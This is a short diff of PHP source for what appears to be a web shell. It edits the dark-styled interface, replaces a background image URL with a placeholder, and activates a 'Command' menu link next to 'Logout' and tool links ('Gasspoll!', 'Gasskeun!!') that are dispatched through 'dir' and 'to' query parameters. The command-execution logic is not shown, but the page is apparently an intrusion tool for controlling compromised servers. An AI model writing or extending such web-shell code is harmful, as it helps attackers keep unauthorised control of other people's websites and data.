@@ -76,7 +76,7 @@ color:white;
        }
        .td_table {;
   background-color: #000000;
-            background-image: url(https://i.gifer.com/2f6g.gif);
+            background-image: url(##KOSONGIN);
             background-repeat: no-repeat;
             background-attachment: fixed;
             background-size: 100%  100%;   
@@ -93,7 +93,7 @@ text-align: center;
   margin: 10px auto;
   resize: none;
   background-color: #000000;
-            background-image: url(https://i.gifer.com/2f6g.gif);
+            background-image: url(##KOSONGIN);
             background-repeat: no-repeat;
             background-attachment: fixed;
             background-size: 100%  100%;   
@@ -166,11 +166,11 @@ echo "</td></tr>";
 echo "</table>";
 echo "<center>";
 echo "<center><table id='menu' width='990' border='0' cellpadding='0' cellspacing='0'><tr><td>";
-// echo "<a class='destroy_table' href='?'>Home</a>";
+echo "<a class='destroy_table' href='?dir=$dir&to=cmd'>Command</a>";
 echo "<a class='destroy_table' href='?logout=true'>Logout</a>";
 echo "<a class='destroy_table' href='?dir=$dir&to=z4phy'>Gasspoll!</a>";
 echo "<a class='destroy_table' href='?dir=$dir&to=z4p'>Gasskeun!!</a><br>";
-echo "<a class='destroy_table' href='?dir=$dir&to=cmd'>Command</a>";
+// echo "<a class='destroy_table' href='?'>Home</a>";
 echo "</center>";
 
 if($_GET['to'] == 'z4phy') {
